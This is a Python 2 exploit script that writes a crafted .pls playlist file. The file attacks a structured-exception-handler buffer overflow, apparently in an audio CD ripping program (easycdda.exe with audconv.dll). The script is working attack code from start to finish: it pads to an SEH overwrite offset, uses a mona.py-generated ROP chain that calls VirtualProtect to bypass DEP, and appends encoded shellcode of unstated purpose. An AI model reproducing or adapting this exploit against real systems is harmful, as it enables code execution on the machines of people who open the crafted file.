import os,struct

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x10087fe1,  # POP ECX # RETN [audconv.dll] 
      0x0042a0e0,  # ptr to &VirtualProtect() [IAT easycdda.exe]
      0x10041e69,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [audconv.dll] 
      0x10035802,  # XCHG EAX,ESI # RETN [audconv.dll] 
      0x1000327e,  # POP EBP # RETN [audconv.dll] 
      0x00403054,  # & push esp # ret 0x08 [easycdda.exe]
      0x0041c160,  # POP EBX # RETN [easycdda.exe] 
      0x00000201,  # 0x00000201-> ebx
      0x1007f883,  # POP EDX # RETN [audconv.dll] 
      0x00000040,  # 0x00000040-> edx
      0x10090089,  # POP ECX # RETN [audconv.dll] 
      0x00434ce9,  # &Writable location [easycdda.exe]
      0x1005d353,  # POP EDI # RETN [audconv.dll] 
      0x100378e6,  # RETN (ROP NOP) [audconv.dll]
      0x1007f18a,  # POP EAX # RETN [audconv.dll] 
      0x90909090,  # nop
      0x00429692,  # PUSHAD # INC EBX # ADD CL,CH # RETN [easycdda.exe] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

offset_nseh = 1108	#SEH record (nseh field) at 0x0012f4f4 overwritten with normal pattern : 0x6c42396b (offset 1108)
junk1 = "A" * offset_nseh
nseh = "\x90" * 4
seh = struct.pack('L',0x1001b19b)  		# ADD ESP,0C10 # RETN 0x04 [audconv.dll]
ropnops = struct.pack('L',0x100013ac)  	# RET [audconv.dll]
buf =  ""
buf += "\x81\xc4\x24\xfa\xff\xff"	# add esp,-1500
buf += "\xdb\xc8\xd9\x74\x24\xf4\xb8\x20\xa5\xd2\xfe\x5e\x33"
buf += "\xc9\xb1\x47\x83\xee\xfc\x31\x46\x14\x03\x46\x34\x47"
buf += "\x27\x02\xdc\x05\xc8\xfb\x1c\x6a\x40\x1e\x2d\xaa\x36"
buf += "\x6a\x1d\x1a\x3c\x3e\x91\xd1\x10\xab\x22\x97\xbc\xdc"
buf += "\x83\x12\x9b\xd3\x14\x0e\xdf\x72\x96\x4d\x0c\x55\xa7"
buf += "\x9d\x41\x94\xe0\xc0\xa8\xc4\xb9\x8f\x1f\xf9\xce\xda"
buf += "\xa3\x72\x9c\xcb\xa3\x67\x54\xed\x82\x39\xef\xb4\x04"
buf += "\xbb\x3c\xcd\x0c\xa3\x21\xe8\xc7\x58\x91\x86\xd9\x88"
buf += "\xe8\x67\x75\xf5\xc5\x95\x87\x31\xe1\x45\xf2\x4b\x12"
buf += "\xfb\x05\x88\x69\x27\x83\x0b\xc9\xac\x33\xf0\xe8\x61"
buf += "\xa5\x73\xe6\xce\xa1\xdc\xea\xd1\x66\x57\x16\x59\x89"
buf += "\xb8\x9f\x19\xae\x1c\xc4\xfa\xcf\x05\xa0\xad\xf0\x56"
buf += "\x0b\x11\x55\x1c\xa1\x46\xe4\x7f\xad\xab\xc5\x7f\x2d"
buf += "\xa4\x5e\xf3\x1f\x6b\xf5\x9b\x13\xe4\xd3\x5c\x54\xdf"
buf += "\xa4\xf3\xab\xe0\xd4\xda\x6f\xb4\x84\x74\x46\xb5\x4e"
buf += "\x85\x67\x60\xc0\xd5\xc7\xdb\xa1\x85\xa7\x8b\x49\xcc"
buf += "\x28\xf3\x6a\xef\xe3\x9c\x01\x15\x63\xa2\xd4\x14\x76"
buf += "\xcc\xd4\x16\x69\x50\x50\xf0\xe3\x78\x34\xaa\x9b\xe1"
buf += "\x1d\x20\x3a\xed\x8b\x4c\x7c\x65\x38\xb0\x32\x8e\x35"
buf += "\xa2\xa2\x7e\x00\x98\x64\x80\xbe\xb7\x88\x14\x45\x1e"
buf += "\xdf\x80\x47\x47\x17\x0f\xb7\xa2\x2c\x86\x2d\x0d\x5a"
buf += "\xe7\xa1\x8d\x9a\xb1\xab\x8d\xf2\x65\x88\xdd\xe7\x69"
buf += "\x05\x72\xb4\xff\xa6\x23\x69\x57\xcf\xc9\x54\x9f\x50"
buf += "\x31\xb3\x21\xac\xe4\xfd\x57\xdc\x34"
junk2 = "B" * 10000

buffer = junk1 + nseh + seh + ropnops * 23 + rop_chain + buf + junk2

print "[+] Length of total buffer: %s" % len(buffer)
print "[+] Writing sploit in c:\\temp\\ecr.pls"
file = open('c:\\temp\\ecr.pls','wb')
file.write(buffer)
file.close()